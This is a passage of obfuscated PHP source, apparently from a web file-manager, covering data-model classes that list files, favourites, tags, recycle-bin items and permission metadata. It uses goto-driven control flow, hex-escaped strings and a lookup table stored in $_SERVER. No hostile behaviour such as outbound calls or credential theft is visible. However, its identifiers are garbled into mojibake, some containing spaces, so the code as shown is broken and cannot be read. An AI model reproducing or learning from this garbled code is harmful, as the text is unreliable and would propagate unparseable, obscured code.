array_merge($e„”â¶„æˆ, $D∏–ã’ºÇí); return $EáØå≠ä™œ ? isset($D∏–ã’ºÇí[$EáØå≠ä™œ]) ? $D∏–ã’ºÇí[$EáØå≠ä™œ] : null : $D∏–ã’ºÇí; } $aŒê°ûºûí = $this->filterWhere(array($f§Ç‰≤”„â[29] => $AÚà·√ëå¿)); goto DóøÚÌ∂ùÃ; Cè‰ÿÈä“¨: } public function set($AˆÓøûÓÛƒ, $D˘à¢º∞è∆ = false, $BçèµØÉƒ« = '') { goto CºµâÍ„¶ ; CıüÚÕØßã: return $this->addAll($bÂ’‡ÜØ±À, array(), !0); goto AºÃ‘¨ﬁ∆Ã; F¢ÁâöÁ¥œ: $f∞Ï‡ëæÎé = is_array($AˆÓøûÓÛƒ) ? $AˆÓøûÓÛƒ : array($AˆÓøûÓÛƒ => $D˘à¢º∞è∆); foreach ($f∞Ï‡ëæÎé as $Aﬁ¿ÈΩî√Â => $cøêèø—ƒ≥) { if (is_array($cøêèø—ƒ≥)) { $cøêèø—ƒ≥ = json_encode_force($cøêèø—ƒ≥); } $this->checkLength($cøêèø—ƒ≥, !1, $this->tableName . $cçßÖÆ«Ù‰[4] . $AˆÓøûÓÛƒ); $cøêèø—ƒ≥ = self::textEncode($cøêèø—ƒ≥); $f∞Ï‡ëæÎé = array($cçßÖÆ«Ù‰[29] => $BçèµØÉƒ«, $cçßÖÆ«Ù‰[99] => $Aﬁ¿ÈΩî√Â, $cçßÖÆ«Ù‰[365] => $cøêèø—ƒ≥); $bÂ’‡ÜØ±À[] = $this->filterWhere($f∞Ï‡ëæÎé); } if (!$bÂ’‡ÜØ±À) { return !0; } goto CıüÚÕØßã; CºµâÍ„¶ : $cçßÖÆ«Ù‰ =& $_SERVER[Æ¡î¢≠¯™]; $this->cacheRemove($BçèµØÉƒ«); $bÂ’‡ÜØ±À = array(); goto F¢ÁâöÁ¥œ; AºÃ‘¨ﬁ∆Ã: } protected function optionDefault($a‚ßö’ÿÿ« = '') { return !1; } public function setDeep($E§¨Ê•Ú≠Œ, $fÓ˜å¢∞µÆ = false, $Fö√ïõëëá = '') { $cŸˆçÕœÇ§ = explode($_SERVER[Æ¡î¢≠¯™][103], $E§¨Ê•Ú≠Œ); $bä†Ù€è¨† = $this->get(); array_set_value($bä†Ù€è¨†, $E§¨Ê•Ú≠Œ, $fÓ˜å¢∞µÆ); $this->set($cŸˆçÕœÇ§[0], $bä†Ù€è¨†[$cŸˆçÕœÇ§[0]], $Fö√ïõëëá); } public function remove($e∞§ñÜâ§Ó, $c‘Óå¡ÿú∫ = '') { $BËóçÿåÊä =& $_SERVER[Æ¡î¢≠¯™]; $this->cacheRemove($c‘Óå¡ÿú∫); $cãúéä∏Ôˆ = $this->filterWhere(array($BËóçÿåÊä[99] => $e∞§ñÜâ§Ó, $BËóçÿåÊä[29] => $c‘Óå¡ÿú∫)); if (is_null($e∞§ñÜâ§Ó)) { unset($cãúéä∏Ôˆ[$BËóçÿåÊä[99]]); } return $this->where($cãúéä∏Ôˆ)->delete(); } public function cacheSet($CÔñîèéÁÙ, $AÕ‚ÎÃÃ£á = false) { return Cache::set($this->cacheKey($CÔñîèéÁÙ), $AÕ‚ÎÃÃ£á); } public function cacheGet($F–ô¢›˜¶‘) { return Cache::get($this->cacheKey($F–ô¢›˜¶‘)); } public function cacheRemove($aÓﬂ≥èåÜ‹) { return Cache::remove($this->cacheKey($aÓﬂ≥èåÜ‹)); } protected function filterWhere($D‹ïí∫ªß¬) { return $D‹ïí∫ªß¬; } protected function cacheKey($dØ £æ◊≥ˆ) { return $dØ £æ◊≥ˆ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\x65" => "\151\x6f\137\x73\157\x75\162\x63\x65\137\x6d\x65\164\x61", "\155\x65\x74\x61\106\151\145\154\144" => "\x73\x6f\165\x72\x63\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\143\162\145\x61\x74\145\124\151\155\145", "\164\151\155\145", "\x69\x6e\x73\145\162\x74", "\146\x75\156\143\164\151\157\156"), array("\166\151\x65\x77\124\x69\x6d\145", "\x74\x69\155\x65", "\151\156\163\x65\162\164", "\146\165\x6e\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eŒÎ¬“Ü˜) { return $this->listSource(array($_SERVER[Æ¡î¢≠¯™][373] => $eŒÎ¬“Ü˜)); } public function typeName($E‰éëÃﬁ‘∏) { static $eè®û”Ë∫ó = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $eè®û”Ë∫ó[$E‰éëÃﬁ‘∏ . $_SERVER[Æ¡î¢≠¯™][33]]; } public function sourceListInfo($fÒ»Ë⁄≈Ó‘, $cﬂÔ¶«Ô˘¡ = false) { goto fùöúÊÕëö; E‹µπ©…Ô≥: return array_to_keyvalue($Aâ“¬¨âœ∑, $fó˜îÀÆùâ[374]); goto E∫‰Ú≈Û∆Ù; díªõÚ≈ﬂµ: if (!$fÒ»Ë⁄≈Ó‘) { return array(); } $Aâ“¬¨âœ∑ = $this->where(array($fó˜îÀÆùâ[374] => array($fó˜îÀÆùâ[7], $fÒ»Ë⁄≈Ó‘)))->select(); $this->_listDataApply($Aâ“¬¨âœ∑, $cﬂÔ¶«Ô˘¡); goto E‹µπ©…Ô≥; fùöúÊÕëö: $fó˜îÀÆùâ =& $_SERVER[Æ¡î¢≠¯™]; $fÒ»Ë⁄≈Ó‘ = $fÒ»Ë⁄≈Ó‘ ? $fÒ»Ë⁄≈Ó‘ : array(); $fÒ»Ë⁄≈Ó‘ = array_filter(array_unique($fÒ»Ë⁄≈Ó‘)); goto díªõÚ≈ﬂµ; E∫‰Ú≈Û∆Ù: } public function pathInfoFilter($B£√˘ê¨üâ) { goto A‰“è’ûÿπ; FÒ’à±û¡ª: if (isset($B£√˘ê¨üâ[$aà´óêﬂÌ‘[381]]) && $B£√˘ê¨üâ[$aà´óêﬂÌ‘[381]][$aà´óêﬂÌ‘[382]] == -1) { $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[194]); $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[117]); $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[383]); $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[384]); $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[87]); $f€ÃπŒáõÑ = array_remove_value($f€ÃπŒáõÑ, $aà´óêﬂÌ‘[385]); } $B£√˘ê¨üâ = array_field_key($B£√˘ê¨üâ, $f€ÃπŒáõÑ); return $B£√˘ê¨üâ; goto eºÑÕ»”âø; A‰“è’ûÿπ: $aà´óêﬂÌ‘ =& $_SERVER[Æ¡î¢≠¯™]; $B£√˘ê¨üâ[$aà´óêﬂÌ‘[85]] = KodIO::make($B£√˘ê¨üâ[$aà´óêﬂÌ‘[374]]); $B£√˘ê¨üâ[$aà´óêﬂÌ‘[29]] = $B£√˘ê¨üâ[$aà´óêﬂÌ‘[375]] == 1 ? $aà´óêﬂÌ‘[86] : $aà´óêﬂÌ‘[174]; goto c±Ü¨ É¡ß; DÀéı¶Üïß: $AÈßò∞ÎÏÕ .= $aà´óêﬂÌ‘[379]; $AÈßò∞ÎÏÕ .= $aà´óêﬂÌ‘[380]; $f€ÃπŒáõÑ = explode($aà´óêﬂÌ‘[47], $AÈßò∞ÎÏÕ); goto FÒ’à±û¡ª; c±Ü¨ É¡ß: $B£√˘ê¨üâ[$aà´óêﬂÌ‘[376]] = $this->typeName($B£√˘ê¨üâ[$aà´óêﬂÌ‘[376]]); if ($B£√˘ê¨üâ[$aà´óêﬂÌ‘[375]] != 1) { $B£√˘ê¨üâ[$aà´óêﬂÌ‘[167]] = $B£√˘ê¨üâ[$aà´óêﬂÌ‘[377]]; unset($B£√˘ê¨üâ[$aà´óêﬂÌ‘[377]]); } $AÈßò∞ÎÏÕ = $aà´óêﬂÌ‘[378]; goto DÀéı¶Üïß; eºÑÕ»”âø: } public function listUserFav() { goto aàã∫∂∂ó≤; eÖäÜÇôﬂ: foreach ($C€«Óëù»ˆ as &$A¯Ø„Ú”‹£) { $A¯Ø„Ú”‹£ = array($Bíå≥áù∂Ö[390] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[372]], $Bíå≥áù∂Ö[391] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[28]], $Bíå≥áù∂Ö[392] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[85]], $Bíå≥áù∂Ö[393] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[29]], $Bíå≥áù∂Ö[394] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[194]], $Bíå≥áù∂Ö[395] => $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[117]]); if ($A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[29]] == $Bíå≥áù∂Ö[387] && $cê”ç–ã∏ä[$A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[85]]]) { $A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[396]] = $cê”ç–ã∏ä[$A¯Ø„Ú”‹£[$Bíå≥áù∂Ö[85]]]; } } return $C€«Óëù»ˆ; goto e¶öôÈ±·Ÿ; eÎ‚ä◊èíú: $BÉÿÇºÀ∞± = array_to_keyvalue($BÉÿÇºÀ∞±, $Bíå≥áù∂Ö[33], $Bíå≥áù∂Ö[85]); if ($BÉÿÇºÀ∞±) { $cê”ç–ã∏ä = $this->listSource(array($Bíå≥áù∂Ö[388] => array($Bíå≥áù∂Ö[389], $BÉÿÇºÀ∞±))); } $cê”ç–ã∏ä = array_to_keyvalue($cê”ç–ã∏ä[$Bíå≥áù∂Ö[360]], $Bíå≥áù∂Ö[374]); goto eÖäÜÇôﬂ; aàã∫∂∂ó≤: $Bíå≥áù∂Ö =& $_SERVER[Æ¡î¢≠¯™]; $C€«Óëù»ˆ = Model($Bíå≥áù∂Ö[386])->listData(); $BÉÿÇºÀ∞± = array_filter_by_field($C€«Óëù»ˆ, $Bíå≥áù∂Ö[29], $Bíå≥áù∂Ö[387]); goto eÎ‚ä◊èíú; e¶öôÈ±·Ÿ: } public function listUserTag($DÑËµ≠–Ñ») { goto aÂ‚ºÕïÉú; aÂ‚ºÕïÉú: $D∫˘√æ†—• =& $_SERVER[Æ¡î¢≠¯™]; $aŒ’áÕÂëÙ = Model($D∫˘√æ†—•[397])->listData(); $eŒ±ûüÏìï = array_filter_by_field($aŒ’áÕÂëÙ, $D∫˘√æ†—•[398], $DÑËµ≠–Ñ»); goto E§á„≈Ÿ≈≈; DòóéÜ≠–™: return $this->listSource($FÆ±ÎòËØÛ); goto c’Ù¡’»å≈; E§á„≈Ÿ≈≈: $eŒ±ûüÏìï = array_to_keyvalue($eŒ±ûüÏìï, $D∫˘√æ†—•[33], $D∫˘√æ†—•[85]); if (!$eŒ±ûüÏìï) { return array(); } $FÆ±ÎòËØÛ = array($D∫˘√æ†—•[388] => array($D∫˘√æ†—•[389], $eŒ±ûüÏìï)); goto DòóéÜ≠–™; c’Ù¡’»å≈: } public function listUserRecycle() { $aÛß∆äïöÊ =& $_SERVER[Æ¡î¢≠¯™]; $fä≤”ŒêßÎ = Model($aÛß∆äïöÊ[399])->listData(); if (!$fä≤”ŒêßÎ) { return array(); } $eçÙ≥´ˆ£¥ = array($aÛß∆äïöÊ[388] => array($aÛß∆äïöÊ[389], $fä≤”ŒêßÎ), $aÛß∆äïöÊ[400] => 1); return $this->listSource($eçÙ≥´ˆ£¥); } public function listSource($A¯£ÑÆ˜’Ë, $Cò‡Ìë¿Ç¡ = 3000) { goto fØÆ‡ÓÊøÖ; fØÆ‡ÓÊøÖ: $CÏ¿°·®⁄Õ =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($A¯£ÑÆ˜’Ë[$CÏ¿°·®⁄Õ[401]])) { $A¯£ÑÆ˜’Ë[$CÏ¿°·®⁄Õ[401]] = 0; } $Cœæ¥æÒ◊é = $CÏ¿°·®⁄Õ[402]; goto bÌÁ‡≠·ìØ; BÆ›íÍ™Úµ: return $dÈˆ÷å£ê¬; goto FëèáÒÊÜ·; bÌÁ‡≠·ìØ: $dÈˆ÷å£ê¬ = $this->field($Cœæ¥æÒ◊é)->_makeOrder()->where($A¯£ÑÆ˜’Ë)->selectPage($Cò‡Ìë¿Ç¡); $this->_listDataApply($dÈˆ÷å£ê¬[$CÏ¿°·®⁄Õ[360]]); $this->_listMake($dÈˆ÷å£ê¬); goto BÆ›íÍ™Úµ; FëèáÒÊÜ·: } protected function _makeOrder() { goto DıéÑÚ—ËÁ; DıéÑÚ—ËÁ: $dìåºãåûË =& $_SERVER[Æ¡î¢≠¯™]; $C—ñ‘†ïë» = Model($dìåºãåûË[403])->get($dìåºãåûË[404]); $B∫—ÌóÑæÏ = Model($dìåºãåûË[403])->get($dìåºãåûË[405]); goto fœÓ¡ºå¯÷; a¿÷œºÜ«Í: if ($fÌç–´âÎÜ == $dìåºãåûË[28]) { } $E„ˆââ∆ù∆ = $dìåºãåûË[413] . $f®»üÕÜ‘ñ[$fÌç–´âÎÜ] . $dìåºãåûË[50] . $DÔ∏âØ±Ø¥[$DÒÂÌ…ÚÔà]; return $this->order(rtrim(trim($E„ˆââ∆ù∆), $dìåºãåûË[47])); goto c∆ÙƒËª‘¢; b÷Ωà”Ùº•: $DÒÂÌ…ÚÔà = Input::get($dìåºãåûË[412], $dìåºãåûË[7], $B∫—ÌóÑæÏ, array_keys($DÔ∏âØ±Ø¥)); if (!in_array($fÌç–´âÎÜ, array_keys($f®»üÕÜ‘ñ))) { $fÌç–´âÎÜ = $dìåºãåûË[28]; } if (!in_array($DÒÂÌ…ÚÔà, array_keys($DÔ∏âØ±Ø¥))) { $fÌç–´âÎÜ = $dìåºãåûË[406]; } goto a¿÷œºÜ«Í; fœÓ¡ºå¯÷: $DÔ∏âØ±Ø¥ = array($dìåºãåûË[406] => $dìåºãåûË[407], $dìåºãåûË[408] => $dìåºãåûË[409]); $f®»üÕÜ‘ñ = array($dìåºãåûË[28] => $dìåºãåûË[28], $dìåºãåûË[87] => $dìåºãåûË[87], $dìåºãåûË[167] => $dìåºãåûË[377], $dìåºãåûË[383] => $dìåºãåûË[383], $dìåºãåûË[410] => $dìåºãåûË[384], $dìåºãåûË[194] => $dìåºãåûË[194], $dìåºãåûË[117] => $dìåºãåûË[117]); $fÌç–´âÎÜ = Input::get($dìåºãåûË[411], $dìåºãåûË[7], $C—ñ‘†ïë», array_keys($f®»üÕÜ‘ñ)); goto b÷Ωà”Ùº•; c∆ÙƒËª‘¢: } protected function _listDataApplyItem($CÜ≈πÖŒø£, $FÓ¶≈≈¥á‚ = false) { $bÜÉ˜Ç∑≤» = array($CÜ≈πÖŒø£); $this->_listDataApply($bÜÉ˜Ç∑≤», $FÓ¶≈≈¥á‚); return $bÜÉ˜Ç∑≤»[0]; } protected function _listDataApply(&$cÙÌÓïà‡ä, $déÊ≠ª˜ò¿ = false) { goto aà¿ﬂ√Ì¡; e‰ˆÊ–õå∫: $this->_listAppendUser($cÙÌÓïà‡ä); $this->_listFilterInfo($cÙÌÓïà‡ä, $déÊ≠ª˜ò¿); goto d›Ã®√Ÿ°∑; A∫ô·≠”âø: $EùÍÉ¢©Á« = array_unique($EùÍÉ¢©Á«); $this->_listSourceCache($cÙÌÓïà‡ä); if (!$déÊ≠ª˜ò¿) { $this->_listAppendMeta($cÙÌÓïà‡ä, $EùÍÉ¢©Á«); $this->_listAppendFileMeta($cÙÌÓïà‡ä, $EùÍÉ¢©Á«); $this->_listAppendChildren($cÙÌÓïà‡ä, $EùÍÉ¢©Á«); } goto EÑÚ»≠›å–; aà¿ﬂ√Ì¡: $FÈ•∆≈ò€œ =& $_SERVER[Æ¡î¢≠¯™]; if (!$cÙÌÓïà‡ä) { $cÙÌÓïà‡ä = array(); return; } $EùÍÉ¢©Á« = array_to_keyvalue($cÙÌÓïà‡ä, $FÈ•∆≈ò€œ[33], $FÈ•∆≈ò€œ[374]); goto A∫ô·≠”âø; EÑÚ»≠›å–: $this->_listAppendPath($cÙÌÓïà‡ä); $this->_listAppendAuth($cÙÌÓïà‡ä); $this->_listAppendSourceInfo($cÙÌÓïà‡ä, $EùÍÉ¢©Á«); goto e‰ˆÊ–õå∫; d›Ã®√Ÿ°∑: } protected function _listSourceCache($D§áﬂàº¥´) { $D·ÍîΩ•∑¶ =& $_SERVER[Æ¡î¢≠¯™]; foreach ($D§áﬂàº¥´ as $Aﬂò¥õÉˆÜ) { self::$cacheSourceInfo[$D·ÍîΩ•∑¶[414] . $Aﬂò¥õÉˆÜ[$D·ÍîΩ•∑¶[374]]] = $Aﬂò¥õÉˆÜ; } } protected function _listFilterInfo(&$aÏ∆Ûıß’ì, $FãΩÜ‡¥è‹ = false) { $b¥∆Œ≤√Íå =& $_SERVER[Æ¡î¢≠¯™]; foreach ($aÏ∆Ûıß’ì as &$Eø†ÙëóúΩ) { $Eø†ÙëóúΩ = $this->pathInfoFilter($Eø†ÙëóúΩ); self::$cachePathInfo[$b¥∆Œ≤√Íå[415] . intval($FãΩÜ‡¥è‹) . $b¥∆Œ≤√Íå[416] . $Eø†ÙëóúΩ[$b¥∆Œ≤√Íå[374]]] = $Eø†ÙëóúΩ; } } protected function _listMake(&$a≤»‹¿°Üä) { $CÜ€çˆ√Ê” =& $_SERVER[Æ¡î¢≠¯™]; $a≤»‹¿°Üä[$CÜ€çˆ√Ê”[84]] = array(); $a≤»‹¿°Üä[$CÜ€çˆ√Ê”[83]] = array(); foreach ($a≤»‹¿°Üä[$CÜ€çˆ√Ê”[360]] as $E∑áîê´Û◊) { $D≤ùÌõçäﬂ = $E∑áîê´Û◊[$CÜ€çˆ√Ê”[375]] == 1 ? $CÜ€çˆ√Ê”[84] : $CÜ€çˆ√Ê”[83]; $a≤»‹¿°Üä[$D≤ùÌõçäﬂ][] = $E∑áîê´Û◊; } unset($a≤»‹¿°Üä[$CÜ€çˆ√Ê”[360]]); } protected function _listAppendMeta(&$cÚΩ‡ÖÜÊï, $dıÒÖˆØ€À) { goto C÷‡¬»ˆè◊; cãÃƒà∏ŸÂ: if (!$Cõ¥ÿ∆ßÿ¿) { return; } $dú÷æç´å = array($E◊¶¨êÉäê[419], $E◊¶¨êÉäê[420]); $eﬂà¶£Õ«è = array(); goto Eåçâãü™ê; Eåçâãü™ê: foreach ($Cõ¥ÿ∆ßÿ¿ as $E£∞ˆƒ™ËÓ) { if (!isset($eﬂà¶£Õ«è[$E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[374]]])) { $eﬂà¶£Õ«è[$E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[374]]] = array(); } if (in_array($E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[99]], $dú÷æç´å)) { continue; } $eﬂà¶£Õ«è[$E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[374]]][$E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[99]]] = $E£∞ˆƒ™ËÓ[$E◊¶¨êÉäê[365]]; } foreach ($cÚΩ‡ÖÜÊï as &$Aû’ÚóËÂá) { $Aû’ÚóËÂá[$E◊¶¨êÉäê[421]] = !1; if (isset($eﬂà¶£Õ«è[$Aû’ÚóËÂá[$E◊¶¨êÉäê[374]]])) { $Aû’ÚóËÂá[$E◊¶¨êÉäê[421]] = $eﬂà¶£Õ«è[$Aû’ÚóËÂá[$E◊¶¨êÉäê[374]]]; } if ($this->fileIsLock($Aû’ÚóËÂá) && $Aû’ÚóËÂá[$E◊¶¨êÉäê[381]]) { $c⁄”ñŒ—ŒÈ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Aû’ÚóËÂá[$E◊¶¨êÉäê[381]][$E◊¶¨êÉäê[382]] = AuthModel::authDisable($Aû’ÚóËÂá[$E◊¶¨êÉäê[381]][$E◊¶¨êÉäê[382]], $c⁄”ñŒ—ŒÈ); $Aû’ÚóËÂá[$E◊¶¨êÉäê[381]][$E◊¶¨êÉäê[422]][$E◊¶¨êÉäê[381]] = $Aû’ÚóËÂá[$E◊¶¨êÉäê[381]][$E◊¶¨êÉäê[382]]; } } goto eà´¥ﬁµÍÇ; C÷‡¬»ˆè◊: $E◊¶¨êÉäê =& $_SERVER[Æ¡î¢≠¯™]; $B€ÀˆúΩÑ≈ = array($E◊¶¨êÉäê[388] => array($E◊¶¨êÉäê[389], $dıÒÖˆØ€À)); $Cõ¥ÿ∆ßÿ¿ = Model($E◊¶¨êÉäê[417])->field($E◊¶¨êÉäê[418])->where($B€ÀˆúΩÑ≈)->select(); goto cãÃƒà∏ŸÂ; eà´¥ﬁµÍÇ: } protected function _listAppendFileMeta(&$e¶ÑáÇß¯†, $A«Î÷Çë⁄©) { goto fÔ‘“ù≤¶‚; fÔ‘“ù≤¶‚: $e≠ÃÂ∑Ù–ƒ =& $_SERVER[Æ¡î¢≠¯™]; $E¨éÉ∑∫‘≤ = array_to_keyvalue($e¶ÑáÇß¯†, $e≠ÃÂ∑Ù–ƒ[33], $e≠ÃÂ∑Ù–ƒ[423]); $E¨éÉ∑∫‘≤ = array_filter(array_unique($E¨éÉ∑∫‘≤)); goto B‚ﬂáüπäö; B‚ﬂáüπäö: if (!$E¨éÉ∑∫‘≤) { return; } $BòËï„Ω˘é = array($e≠ÃÂ∑Ù–ƒ[424] => array($e≠ÃÂ∑Ù–ƒ[389], $E¨éÉ∑∫‘≤)); $b¯≈ÎÉÊ∏√ = $e≠ÃÂ∑Ù–ƒ[425]; goto fÕÌﬂÚïò¯; d≠ÏÃ•çÀ∞: foreach ($e¶ÑáÇß¯† as &$D·Ùã¨¯√ç) { goto AõÚÚî€»‘; AõÚÚî€»‘: $a¿Íé⁄ˆ…ı = $D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[423]]; if (!$a¿Íé⁄ˆ…ı || !isset($dº‡ÏÉüËÍ[$a¿Íé⁄ˆ…ı])) { continue; } $cÉ∞ÊÁ≤€ = $dº‡ÏÉüËÍ[$a¿Íé⁄ˆ…ı]; goto CøçäÜßà ; CøçäÜßà : $cÉ∞ÊÁ≤€[$e≠ÃÂ∑Ù–ƒ[87]] = $D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[87]]; $cÉ∞ÊÁ≤€[$e≠ÃÂ∑Ù–ƒ[28]] = $D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[28]]; self::$cacheFileInfo[$e≠ÃÂ∑Ù–ƒ[429] . $a¿Íé⁄ˆ…ı] = $cÉ∞ÊÁ≤€; goto fëÍ´∂å≠; b¯ƒñûΩÇ›: if (isset($D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[169]][$e≠ÃÂ∑Ù–ƒ[430]])) { $D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[430]] = json_decode($D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[169]][$e≠ÃÂ∑Ù–ƒ[430]], !0); unset($D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[169]][$e≠ÃÂ∑Ù–ƒ[430]]); } goto AΩ–‹‹∆ÿÍ; fëÍ´∂å≠: unset($dº‡ÏÉüËÍ[$a¿Íé⁄ˆ…ı][$e≠ÃÂ∑Ù–ƒ[85]]); $eºÌåÕÙÎÖ = is_array($dÜﬁòÆœ•Ê[$a¿Íé⁄ˆ…ı]) ? $dÜﬁòÆœ•Ê[$a¿Íé⁄ˆ…ı] : array(); $D·Ùã¨¯√ç[$e≠ÃÂ∑Ù–ƒ[169]] = array_merge($eºÌåÕÙÎÖ, $dº‡ÏÉüËÍ[$a¿Íé⁄ˆ…ı]); goto b¯ƒñûΩÇ›; AΩ–‹‹∆ÿÍ: } goto eﬂéÉï⁄Èì; fÕÌﬂÚïò¯: $dº‡ÏÉüËÍ = Model($e≠ÃÂ∑Ù–ƒ[426])->field($b¯≈ÎÉÊ∏√)->where($BòËï„Ω˘é)->select(); $dº‡ÏÉüËÍ = array_to_keyvalue($dº‡ÏÉüËÍ, $e≠ÃÂ∑Ù–ƒ[423]); $C˘¡âÂ†Ü¿ = Model($e≠ÃÂ∑Ù–ƒ[427])->field($e≠ÃÂ∑Ù–ƒ[428])->where($BòËï„Ω˘é)->select(); goto C‚–•¥•Ñì; C‚–•¥•Ñì: $C˘¡âÂ†Ü¿ = $C˘¡âÂ†Ü¿ ? $C˘¡âÂ†Ü¿ : array(); $dÜﬁòÆœ•Ê = array(); foreach ($C˘¡âÂ†Ü¿ as $F™ŸÜ©ÜØÔ) { if (!isset($dÜﬁòÆœ•Ê[$F™ŸÜ©ÜØÔ[$e≠ÃÂ∑Ù–ƒ[423]]])) { $dÜﬁòÆœ•Ê[$F™ŸÜ©ÜØÔ[$e≠ÃÂ∑Ù–ƒ[423]]] = array(); } $dÜﬁòÆœ•Ê[$F™ŸÜ©ÜØÔ[$e≠ÃÂ∑Ù–ƒ[423]]][$F™ŸÜ©ÜØÔ[$e≠ÃÂ∑Ù–ƒ[99]]] = $F™ŸÜ©ÜØÔ[$e≠ÃÂ∑Ù–ƒ[365]]; } goto d≠ÏÃ•çÀ∞; eﬂéÉï⁄Èì: } protected function _listAppendSourceInfo(&$dçê∫∫¥öç, $d´éç…ÜèÇ) { goto eî√°«’˘˜; EóÍƒ£¢ëë: $e∆ò©‚ˆ˜¡ = array_to_keyvalue_group($e†«àÚô‹‡, $b•Í»ı¥ÁÁ[374]); foreach ($dçê∫∫¥öç as &$b∏¬ﬁ•™‡—) { $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]] = array($b•Í»ı¥ÁÁ[434] => 0, $b•Í»ı¥ÁÁ[435] => 0, $b•Í»ı¥ÁÁ[436] => 0); if (isset($Bç°˘ó˜≥ë[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]])) { $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[437]] = 1; $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[438]] = $Bç°˘ó˜≥ë[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]][$b•Í»ı¥ÁÁ[28]]; } if (isset($bã´å≥’ø[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]])) { $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[439]] = array(); foreach ($bã´å≥’ø[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]] as $DÿÁƒçâ™ñ) { $a⁄∑»”¯ƒÉ = $Fß∫⁄÷¨√ø[$DÿÁƒçâ™ñ]; $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[439]][] = array($b•Í»ı¥ÁÁ[440] => $a⁄∑»”¯ƒÉ[$b•Í»ı¥ÁÁ[372]], $b•Í»ı¥ÁÁ[391] => $a⁄∑»”¯ƒÉ[$b•Í»ı¥ÁÁ[28]], $b•Í»ı¥ÁÁ[441] => $a⁄∑»”¯ƒÉ[$b•Í»ı¥ÁÁ[442]]); } } if (isset($e∆ò©‚ˆ˜¡[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]])) { $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[443]] = array(); foreach ($e∆ò©‚ˆ˜¡[$b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[374]]] as $dÌ—»¶Ω˘◊) { $b∏¬ﬁ•™‡—[$b•Í»ı¥ÁÁ[396]][$b•Í»ı¥ÁÁ[443]] = array($b•Í»ı¥ÁÁ[444] => $dÌ—»¶Ω˘◊[$b•Í»ı¥ÁÁ[445]], $b•Í»ı¥ÁÁ[446] => $dÌ—»¶Ω˘◊[$b•Í»ı¥ÁÁ[447]], $b•Í»ı¥ÁÁ[448] => $dÌ—»¶Ω˘◊[$b•Í»ı¥ÁÁ[374]], $b•Í»ı¥ÁÁ[449] => $dÌ—»¶Ω˘◊[$b•Í»ı¥ÁÁ[450]], $b•Í»ı¥ÁÁ[451] => $dÌ—»¶Ω˘◊[$b•Í»ı¥ÁÁ[452]]); } } } return $dçê∫∫¥öç; goto b£ª∑¢«…∆; cÜˆô•ŸÑ„: $fÜƒÜôâô— = Model($b•Í»ı¥ÁÁ[397])->listData(); $B¡ﬁ“–¬≤ = Model($b•Í»ı¥ÁÁ[386])->listData(); $e†«àÚô‹‡ = Model($b•Í»ı¥ÁÁ[433])->listSimple(); goto e≈âíÆ•É˜; eî√°«’˘˜: $b•Í»ı¥ÁÁ =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($b•Í»ı¥ÁÁ[431])) { return; } $dªÇÈô‰óß = Model($b•Í»ı¥ÁÁ[432])->listData(); goto cÜˆô•ŸÑ„; e≈âíÆ•É˜: $Fß∫⁄÷¨√ø = array_to_keyvalue($dªÇÈô‰óß, 